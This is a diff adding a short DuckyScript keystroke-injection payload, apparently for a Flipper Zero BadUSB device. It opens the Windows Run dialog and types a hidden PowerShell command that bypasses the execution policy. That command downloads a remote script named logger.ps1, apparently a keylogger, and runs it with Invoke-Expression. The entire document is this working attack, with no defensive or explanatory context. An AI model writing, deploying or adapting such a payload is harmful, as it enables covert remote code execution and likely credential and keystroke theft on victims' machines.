@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass "irm raw.githubusercontent.com/LupierHN/Flipper-zero-projekt/master/logger.ps1 | iex"
+ENTER
